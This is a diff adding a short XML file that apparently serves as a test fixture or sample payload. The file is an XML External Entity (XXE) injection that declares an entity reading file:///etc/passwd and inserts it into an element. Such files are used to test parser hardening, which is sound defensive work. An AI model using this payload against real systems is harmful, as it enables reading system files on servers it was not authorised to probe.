@@ -1,0 +1,5 @@
+<?xml version="1.0"?>
+<!DOCTYPE own [<!ENTITY pwned SYSTEM "file:///etc/passwd">]>
+<something>
+    <here> &pwned; </here>
+</something>
